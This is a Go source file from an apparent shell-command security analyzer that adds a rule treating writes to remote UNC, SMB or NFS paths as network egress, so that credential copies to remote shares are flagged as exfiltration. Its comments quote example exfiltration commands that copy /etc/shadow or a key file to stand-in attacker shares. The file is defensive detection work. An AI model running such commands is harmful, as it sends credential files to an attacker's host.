package analysis

import (
	"sort"

	"github.com/v0lka/flowsh/engine"
)

// ===========================================================================
// Remote filesystem writes are network writes (Finding 81)
// ===========================================================================
//
// A UNC (SMB) path does not name a location on this host: reading or writing
// `\\host\share\…` (or `//host/share/…`) sends the bytes over the network to
// that authority. The effect IR has no remote-filesystem kind, so both
// frontends modelled the operation as a plain local FSWrite and the destination
// was invisible to the network layer: `cp /etc/shadow //e.test/share/x` graded
// High with `exfil=None` and no `NetEgress`, so an `Exfiltration: Deny` policy
// admitted a credential copy to an attacker's share, and
// `Move-Item key \\e.test\share\x` in PowerShell did the same.
//
// The rule below restores the missing half of the model: every write effect
// whose target is a UNC authority contributes a NetEgress to that host, tainted
// with the credential material the same command read — which is exactly the
// pairing DetectExfil looks for. It runs in the composition facade (not in a
// single frontend) so the bash binder and the PowerShell lowerer cannot drift
// apart on it.
//
// The rule is one-sided by construction: it can add a network effect to a
// write, never remove one, and it never touches the filesystem. An authority
// that is unambiguous is named; the forward-slash spelling whose first
// component is a single label (`//attacker/share/x`) is a UNC path to Windows
// and a doubled separator to POSIX, so instead of guessing it is modelled as
// an unresolved sink — NetEgress over ⊤ (engine.UNCUnresolved, Finding 87). A
// path that names no share at all (`//host`, `/etc/shadow`) is left alone.

// applyRemoteWriteSinks adds the NetEgress effect each remote (UNC) write
// implies, folded with the provenance of everything the command reads. It
// returns effects unchanged when the command writes no UNC target.
func applyRemoteWriteSinks(effects []engine.Effect) []engine.Effect {
	hosts := make([]string, 0, 2)
	seen := make(map[string]bool, 2)
	unresolved := false
	for _, e := range effects {
		switch e.Kind {
		case engine.KindFSWrite, engine.KindFSMeta:
		default:
			continue
		}
		for _, t := range e.Target.Targets() {
			host, ok := engine.UNCHost(t)
			if !ok {
				// The authority could be a single-label UNC host or a local
				// path with a doubled separator; the text does not decide
				// (Finding 87). Report the egress with an unresolved target
				// instead of guessing the path is local.
				if engine.UNCUnresolved(t) {
					unresolved = true
					continue
				}
				// The NFS/scp remote spelling `[user@]host:/path` names an
				// authority too (Finding 99): mounting it contacts the host, and
				// a write under the mount point travels there.
				if h, isRemote := engine.HostPath(t); isRemote {
					if !seen[h] {
						seen[h] = true
						hosts = append(hosts, h)
					}
				}
				continue
			}
			if seen[host] {
				continue
			}
			seen[host] = true
			hosts = append(hosts, host)
		}
	}
	if len(hosts) == 0 && !unresolved {
		return effects
	}
	payload := remoteSinkPayload(effects)
	sort.Strings(hosts)
	for _, host := range hosts {
		e := engine.Effect{
			Kind:       engine.KindNetEgress,
			Target:     engine.ScopeOf(host),
			Mode:       engine.ModeDirect,
			Certainty:  engine.CertaintyCertain,
			Taint:      payload,
			Reversible: true,
			NetFlow:    engine.FlowNone,
		}
		effects = append(effects, e)
	}
	if unresolved {
		e := engine.Effect{
			Kind:       engine.KindNetEgress,
			Target:     engine.ScopeTop(),
			Mode:       engine.ModeDirect,
			Certainty:  engine.CertaintyCertain,
			Taint:      payload,
			Reversible: true,
			NetFlow:    engine.FlowNone,
		}
		effects = append(effects, e)
	}
	// Re-normalise so the added egress merges with any NetEgress the command
	// already carries (a remote copy also spelled as an upload): the report's
	// invariant is one effect per (kind, mode, flow role), not one per source.
	return normalizeEffects(effects)
}

// remoteSinkPayload is the provenance the remote write carries: everything the
// command reads, with the secret label attached when a read names a credential
// location — the same join bind.taintEgress applies to a declared egress
// destination, so a remote copy of a credential file pairs like an upload.
func remoteSinkPayload(effects []engine.Effect) engine.Taint {
	payload := engine.TaintBottom()
	for _, e := range effects {
		switch e.Kind {
		case engine.KindFSRead, engine.KindFSMeta, engine.KindCredAccess:
		default:
			continue
		}
		payload = payload.Join(e.Taint)
		if engine.IsSecretRead(e) {
			payload = payload.Join(engine.TaintOf(engine.TaintSecret))
		}
	}
	return payload
}
